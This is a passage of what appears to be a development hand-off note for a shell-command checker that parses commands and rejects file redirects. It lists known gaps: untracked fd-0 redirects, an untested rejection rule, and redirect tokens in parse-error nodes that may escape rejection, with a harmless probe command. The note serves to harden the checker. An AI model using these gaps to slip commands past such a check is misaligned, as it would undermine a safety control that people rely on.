  Carry forward as known gaps for the children: fd-0 output dup/close (`0>&1`, `0>&-`) not tracked; `>(cmd)` should give cmd stdin=pipe; the "reject every file redirect in an unparseable tree" rule has no test that pins it; that rule also rejects harmless typed extglob + `2>/dev/null` (policy call: proposals only, or only redirects touching the ERROR node?); loose redirect tokens inside ERROR nodes may escape rejection (unconfirmed, probe `echo @(x|) >&3` with pinned grammar).
  Many §6 items are stale from earlier rounds (T2 threat model, §7 stub proof, function-body stdin) — the re-plan should start from a fresh list.
- Full previous attempt preserved in `iteration-v6/` (patch.diff, build-notes.md, SUMMARY.md, check-*).
- Address the above; do NOT re-attempt the rejected approach unchanged. Satisfy the brief's Success criterion (the end result).
